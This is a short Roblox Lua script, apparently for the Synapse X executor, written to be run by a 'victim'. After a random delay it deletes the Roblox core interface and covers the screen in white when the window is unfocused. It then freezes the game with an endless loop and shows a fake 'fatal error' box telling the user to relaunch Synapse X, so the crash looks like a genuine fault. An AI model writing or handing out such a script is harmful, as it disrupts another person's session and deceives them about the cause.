_G.Debug = true -- ignore this decided to switch to two diff versions half way

waitTime = math.random(15,60) 
counterDebug = waitTime 

if _G.Debug then 
	game.StarterGui:SetCore("SendNotification", {
		Title = "garfield"; 
		Text = "debug is enabled! if you would like to disable debug, use the non-debugged version.";
		Icon = nil; 
		Duration = 5; 
	})

	game.StarterGui:SetCore("SendNotification", {
		Title = "garfield"; 
		Text = "press f9 to check counter";
		Icon = nil; 
		Duration = 5; 
	})

	spawn(function()
		while wait(1) do 
			counterDebug = counterDebug - 1 
			print("currently "..tostring(counterDebug).." seconds left.")
		end 
	end) 
end 

wait(waitTime)

if not iswindowactive() then -- "Freeze" up client if unfocused at time of victimage
	-- Remove roblox buttons
	for i,v in pairs(game:GetService("CoreGui"):GetDescendants()) do
		v:Destroy()
	end

	-- Create white screen
	local a=Instance.new("ScreenGui")local b=Instance.new("Frame")a.Name="closer"a.Parent=game.CoreGui;a.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;b.Parent=a;b.BackgroundColor3=Color3.fromRGB(255,255,255)b.Position=UDim2.new(-0.0232732724,0,-0.0404907987,0)b.Size=UDim2.new(0,5000,0,5000)
end 


-- Crash game
spawn(function()
	wait(0.5)
	while true do end
end)

-- Fake messagebox
messagebox("A fatal error occurred. Please relaunch Synapse X.", "Synapse X", 0x10)
